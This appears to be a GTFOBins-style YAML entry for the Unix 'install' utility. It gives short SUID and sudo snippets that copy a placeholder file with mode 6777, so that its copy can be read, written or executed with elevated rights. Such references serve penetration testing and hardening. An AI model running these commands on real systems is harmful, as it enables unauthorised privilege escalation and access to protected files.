---
description: This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a copy of the file.
functions:
  suid:
    - code: |
        LFILE=file_to_change
        TF=$(mktemp)
        ./install -m 6777 $LFILE $TF
  sudo:
    - code: |
        LFILE=file_to_change
        TF=$(mktemp)
        sudo install -m 6777 $LFILE $TF
---
